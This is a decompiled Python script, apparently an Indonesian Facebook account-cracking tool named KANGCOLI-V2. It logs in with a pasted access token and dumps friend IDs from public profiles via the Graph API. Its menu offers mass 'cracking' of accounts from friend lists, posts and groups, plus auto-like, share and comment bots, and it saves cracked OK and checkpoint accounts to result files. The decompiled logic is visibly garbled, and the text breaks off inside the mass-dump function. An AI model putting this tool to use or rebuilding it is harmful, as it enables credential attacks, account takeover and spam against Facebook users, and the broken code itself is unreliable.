# Source Generated with Decompyle++
# File: mak.pyc (Python 3.10)

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re

try:
    import rich
finally:
    pass
if ImportError:
    os.system('pip install rich')
    time.sleep(1)
    
    try:
        import rich
    finally:
        pass
    if ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
    


from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col

try:
    ugen = open('user.txt', 'r').read().splitlines()
finally:
    pass
ugen = [
    'Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']

try:
    ugen2 = open('user2.txt', 'r').read().splitlines()
finally:
    pass
ugen2 = [
    'Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
    'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']

try:
    ugen3 = open('user3.txt', 'r').read().splitnes()
finally:
    pass
ugen3 = [
    'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']

try:
    ugen4 = open('user4.txt', 'r').read().splitnes()
finally:
    pass
ugen4 = [
    'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405']
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import getpass
import urllib
from multiprocessing.pool import ThreadPool

try:
    import mechanize
finally:
    pass
if ImportError:
    os.system('pip2 install mechanize')
else:
    
    try:
        import requests
    finally:
        pass
    if ImportError:
        os.system('pip2 install requests')
    






from requests.exceptions import ConnectionError
from mechanize import Browser

def mkdir(z):
    pass


def load():
    tiload = [
        '.   ',
        '..  ',
        '... ']

back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email = []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
(id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
x = '\x1b[m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
P = '\x1b[0;00m'
J = '\x1b[0;33m'
S = '\x1b[0;00m'
N = '\x1b[0m'
I = '\x1b[0;32m'
C = '\x1b[0;36m'
M = '\x1b[0;31m'
U = '\x1b[0;35m'
K = '\x1b[0;33m'
P = '\x1b[00m'
h = '\x1b[0;90m'
Q = '\x1b[00m'
kk = '\x1b[0;32m'
ff = '\x1b[0;36m'
G = '\x1b[0;36m'
p = '\x1b[00m'
h = '\x1b[0;90m'
Q = '\x1b[00m'
I = '\x1b[0;32m'
II = '\x1b[0;36m'
m = '\x1b[0;31m'
O = '\x1b[0;33m'
H = '\x1b[0;33m'
b = '\x1b[0;36m'
war = '[•]'
B = random.choice([
    U,
    I,
    K,
    b,
    M,
    Q,
    S,
    C])
dic = {
    '1': 'Januari',
    '2': 'Februari',
    '3': 'Maret',
    '4': 'April',
    '5': 'Mei',
    '6': 'Juni',
    '7': 'Juli',
    '8': 'Agustus',
    '9': 'September',
    '10': 'Oktober',
    '11': 'November',
    '12': 'Desember' }
dic2 = {
    '01': 'Januari',
    '02': 'Februari',
    '03': 'Maret',
    '04': 'April',
    '05': 'Mei',
    '06': 'Juni',
    '07': 'Juli',
    '08': 'Agustus',
    '09': 'September',
    '10': 'Oktober',
    '11': 'November',
    '12': 'Desember' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def clear():
    os.system('clear')


def back():
    login()


def banner():
    clear()
    wel = '# WELCOME TO KANGCOLI-V2'
    wel2 = mark(wel, 'yellow', **('style',))
    sol().print(wel2)
    au = '   __  _____ _____________      ______  \n  /  |/  / // / __/_  __/ | /| / / __ \\ Creator   : Joker_tzy\n / /|_/ / _  / _/  / /  | |/ |/ / /_/ / Github    : Al-Vino\n/_/  /_/_//_/_/___/_/   |__/|__/\\____/  Instagran : mhff_xy\n             /___/                      Version   : 2.0'
    pengembang1 = nel(au, 'blue', **('style',))
    cetak(nel(pengembang1, 'INFO SCRIPT', **('title',)))


def login():
    banner()
    sky = '# AKSES TOKEN FACEBOOK'
    sky2 = mark(sky, 'cyan', **('style',))
    sol().print(sky2, 'cyan', **('style',))
    panda = input(x + '[' + p + '¥' + x + '] Masukkan Token :\x1b[1;92m ')
    akun = open('.token.txt', 'w').write(panda)
    
    try:
        tes = requests.get('https://graph.facebook.com/me?access_token=' + panda)
        tes3 = json.loads(tes.text)['id']
        sue = '# LOGIN SUKSES'
        suu = mark(sue, 'green', **('style',))
        sol().print(suu, 'cyan', **('style',))
        time.sleep(2.5)
        ss = '# VERSION 2.0'
        so = mark(ss, 'cyan', **('style',))
        sol().print(so, 'yellow', **('style',))
        time.sleep(1)
        token = open('.token.txt', 'r').read()
        tokenku.append(token)
        menu()
    finally:
        return None
        if KeyError:
            sue = '# Login Gagal, Ganti Token Bro'
            suu = mark(sue, 'red', **('style',))
            sol().print(suu, 'cyan', **('style',))
            time.sleep(2.5)
            login()
            return None
        if requests.exceptions.ConnectionError:
            li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
            lo = mark(li, 'red', **('style',))
            sol().print(lo, 'cyan', **('style',))
            exit()
            return None



def menu():
    
    try:
        sh = requests.get('https://httpbin.org/ip').json()
    finally:
        pass
    sh = {
        'origin': '-' }
    
    try:
        birth = tglx + ' ' + blnx + ' ' + thnx
    finally:
        pass
    birth = '-'
    banner()
    sg = '# INFORMASI USER'
    fx = mark(sg, 'cyan', **('style',))
    sol().print(fx)
    print(x + '[' + h + '¥' + x + '] \x1b[0;36mWEBSITE\t\t\t\t:\x1b[1;96m Yandex')
    print(x + '[' + h + '¥' + x + '] \x1b[0;36mSTATUS\t\t\t\t:\x1b[1;92m Premium')
    print(x + '[' + h + '¥' + x + '] \x1b[0;36mYour IP\t\t\t\t: ' + str(sh['origin']))
    io = '[01] ♥ Cracking from friendlist public\n\\[02] ♥ Cracking from public massal (saran)\n\\[03] ♥ Cracking from postingan\n\\[04] ♥ Cracking from grup\n\\[05] ♥ Bot auto share\n\\[06] ♥ Bot auto like\n\\[07] ♥ Bot auto comment post\n\\[08] ♥ Bot auto comment grup\n\\[09] ♥ Check result crack\n\\[10] ♥ Check option checkpoint\n\\[11] ♥ Information script\n\\[00] ♥ Logout (ngecrot)'
    oi = nel(io, 'cyan', **('style',))
    cetak(nel(oi, 'CHOOSE MENU', **('title',)))
    jh = input(x + '[' + p + '¥' + x + '] Pilih : ')
    if jh in ('1', '01'):
        dump_publik()
        return None
    if None in ('2', '02'):
        dump_massal()
        return None
    if None in ('3', '03'):
        like()
        return None
    if None in ('4', '04'):
        grup()
        return None
    if None in ('5', '05'):
        share()
        return None
    if None in ('6', '06'):
        post()
        return None
    if None in ('7', '07'):
        komen()
        return None
    if None in ('8', '08'):
        komen_grup()
        return None
    if None in ('9', '09'):
        result()
        return None
    if None in ('10',):
        file()
        return None
    if None in ('11',):
        info()
        return None
    if None in ('0', '00'):
        os.system('rm -rf .token.txt')
        print(x + '[' + h + '•' + x + '] Tunggu ...')
        time.sleep(1)
        sw = '# SUKSES KELUAR'
        sol().print(mark(sw, 'yellow', **('style',)))
        exit()
        return None
    ric = None
    sol().print(mark(ric, 'red', **('style',)))
    exit()
    return None




def result():
    cek = '# CEK RESULT CRACK'
    sol().print(mark(cek, 'cyan', **('style',)))
    kayes = '[01] Cek Hasil Cp\n[02] Cek Hasil Ok\n[00] Kembali Ke Menu'
    kis = nel(kayes, 'cyan', **('style',))
    cetak(nel(kis, 'RESULTS', **('title',)))
    kz = input(x + '[' + p + '¥' + x + '] Pilih : ')
    if kz in ('1', '01'):
        
        try:
            vin = os.listdir('CP')
        finally:
            pass
        if FileNotFoundError:
            gada = '# DIREKTORI TIDAK DITEMUKAN'
            sol().print(mark(gada, 'red', **('style',)))
            time.sleep(2)
            back()
        

        if len(vin) == 0:
            haha = '# ANDA BELUM MEMILIKI RESULT CP'
            sol().print(mark(haha, 'yellow', **('style',)))
            time.sleep(2)
            back()
            return None
        gerr = None
        sol().print(mark(gerr, 'green', **('style',)))
        cih = 0
        lol = { }
        gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
        sol().print(mark(gerr2, 'cyan', **('style',)))
        geeh = input(x + '[' + p + '¥' + x + '] Pilih : ')
        
        try:
            geh = lol[geeh]
        finally:
            pass
        if KeyError:
            [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in vin ]
            [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in vin ]
            [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in vin ]
            ric = '# ANGKA BUKAN HURUF GOBLOK'
            sol().print(mark(ric, 'red', **('style',)))
            exit()
        else:
            
            try:
                lin = open('CP/' + geh, 'r').read()
            finally:
                pass
            [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in vin ]
            [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in vin ]
            hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
            sol().print(mark(hehe, 'red', **('style',)))
            time.sleep(2)
            back()
            akun = '# LIST AKUN CP ANDA'
            sol().print(mark(akun, 'green', **('style',)))
            hus = os.system('cd CP && cat ' + geh)
            akun2 = '# LIST AKUN CP ANDA'
            sol().print(mark(akun, 'green', **('style',)))
            input(x + '[' + h + '•' + x + '] Kembali')
            back()
            return None
            if kz in ('2', '02'):
                
                try:
                    vin = os.listdir('OK')
                finally:
                    pass
                if FileNotFoundError:
                    gerr = [ {
                        str(cih): str(isi) } ]
                    [ {
                        str(cih): str(isi) } ]
                    [ {
                        str(cih): str(isi) } ]
                    gada = '# DIREKTORI TIDAK DITEMUKAN'
                    sol().print(mark(gada, 'red', **('style',)))
                    time.sleep(2)
                    back()
                

                if len(vin) == 0:
                    haha = '# ANDA BELUM MEMILIKI RESULT OK'
                    sol().print(mark(haha, 'yellow', **('style',)))
                    time.sleep(2)
                    back()
                    return None
                sol().print(mark(gerr, 'cyan', **('style',)))
                cih = 0
                lol = { }
                gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
                sol().print(mark(gerr2, 'cyan', **('style',)))
                geeh = input(x + '[' + p + '¥' + x + '] Pilih : ')
                
                try:
                    geh = lol[geeh]
                finally:
                    pass
                if KeyError:
                    [ '[' + str(cih) + '] ' + isi + ' ==>> ' + str(len(hem)) + ' Akun' + x for isi in vin ]
                    [ '[' + str(cih) + '] ' + isi + ' ==>> ' + str(len(hem)) + ' Akun' + x for isi in vin ]
                    [ '[' + str(cih) + '] ' + isi + ' ==>> ' + str(len(hem)) + ' Akun' + x for isi in vin ]
                    ric = '# PILIHAN TIDAK ADA DI MENU'
                    sol().print(mark(ric, 'red', **('style',)))
                    exit()
                else:
                    
                    try:
                        lin = open('OK/' + geh, 'r').read()
                    finally:
                        pass
                    [ '[' + str(cih) + '] ' + isi + ' ==>> ' + str(len(hem)) + ' Akun' + x for isi in vin ]
                    [ '[' + str(cih) + '] ' + isi + ' ==>> ' + str(len(hem)) + ' Akun' + x for isi in vin ]
                    hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
                    sol().print(mark(hehe, 'red', **('style',)))
                    time.sleep(2)
                    back()
                    akun = '# LIST AKUN OK ANDA'
                    sol().print(mark(akun, 'cyan', **('style',)))
                    hus = os.system('cd OK && cat ' + geh)
                    akun2 = '# OUTPUT-Xy'
                    sol().print(mark(akun, 'green', **('style',)))
                    input(x + '[' + h + '®' + x + '] Kembali')
                    back()
                    return None
                    if kz in ('0', '00'):
                        back()
                        return None
                    ric = [ {
                        str(cih): str(isi) } ]
                    sol().print(mark(ric, 'red', **('style',)))
                    exit()
                    return None






def file():
    tek = '# CEK OPSI DARI FILE'
    sol().print(mark(tek, 'cyan', **('style',)), 'on red', **('style',))
    print(x + '[' + h + '•' + x + '] Sedang Membaca File, Tunggu Sebentar ...')
    time.sleep(2)
    teks = '# PILIH FILE YG AKAN DI CEK'
    sol().print(mark(teks, 'green', **('style',)))
    my_files = []
    
    try:
        lis = os.listdir('CP KONTOL')
    finally:
        pass
    
    try:
        mer = os.listdir('OK')
    finally:
        pass
    if len(my_files) == 0:
        yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'
        sol().print(mark(yy, 'red', **('style',)))
        exit()
        return None
    cih = None
    lol = { }
    teks2 = '# PILIH FILE YG AKAN DI CEK'
    sol().print(mark(teks2, 'green', **('style',)))
    geeh = input(x + '[' + p + 'f' + x + '] Pilih : ')
    
    try:
        geh = lol[geeh]
    finally:
        pass
    if KeyError:
        [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in my_files ]
        [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in my_files ]
        [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in my_files ]
        ric = '# PILIHAN TIDAK ADA DI MENU'
        sol().print(mark(ric, 'red', **('style',)))
        exit()
    else:
        
        try:
            hf = open('CP/' + geh, 'r').readlines()
            cek_opsi()
        finally:
            return None
            if IOError:
                [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in my_files ]
                [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in my_files ]
                [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in my_files ]
                
                try:
                    hf = open('OK/' + geh, 'r').readlines()
                    cek_opsi()
                finally:
                    return None
                    if IOError:
                        [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in my_files ]
                        [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in my_files ]
                        [ '[' + str(cih) + '] ' + isi + ' ---> ' + str(len(hem)) + ' Akun' + x for isi in my_files ]
                        hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
                        sol().print(mark(hehe, 'red', **('style',)))
                        time.sleep(2)
                        back()
                        return None







def dump_publik():
    
    try:
        token = open('.token.txt', 'r').read()
    finally:
        pass
    if IOError:
        exit()
    

    win = '# DUMP ID PUBLIK'
    win2 = mark(win, 'cyan', **('style',))
    sol().print(win2)
    print(x + '[' + h + '¥' + x + ']\x1b[0;36m Ketik ( me ) Jika Ingin Dump ID Dari Daftar Teman Sendiri')
    pil = input(x + '[' + p + '¥' + x + ']\x1b[0;36m Masukkan ID Facebook : ')
    
    try:
        koh2 = requests.get('https://graph.facebook.com/v2.0/' + pil + '?fields=friends.limit(5000)&access_token=' + tokenku[0]).json()
        for pi in koh2['friends']['data']:
            
            try:
                id.append(pi['id'] + '|' + pi['name'])
            finally:
                continue
                continue
                print(x + '[' + h + '¥' + x + ']\x1b[0;36m Total : ' + str(len(id)))
                setting()
                return None
                if requests.exceptions.ConnectionError:
                    li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                    lo = mark(li, 'red', **('style',))
                    sol().print(lo, 'cyan', **('style',))
                    exit()
                    return None
                if (KeyError, IOError):
                    teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
                    teks2 = mark(teks, 'red', **('style',))
                    sol().print(teks2)
                    time.sleep(2)
                    login()
                    return None




def dump_massal():
    win = '# DUMP ID PUBLIK MASSAL'
    win2 = mark(win, 'cyan', **('style',))
    sol().print(win2)
    print(x + '[' + h + '¥' + x + ']\x1b[0;36m MASUKKAN JUMLAH ID TARGET')
    
    try:
        jum = int(input(x + '[' + p + '¥' + x + ']\x1b[0;36m MAU BERAPA ID NJING: '))
    finally:
        pass
    if ValueError:
        pesan = '# MASUKKAN ANGKA BUKAN HURUF KONTOL'
        pesan2 = mark(pesan, 'red', **('style',)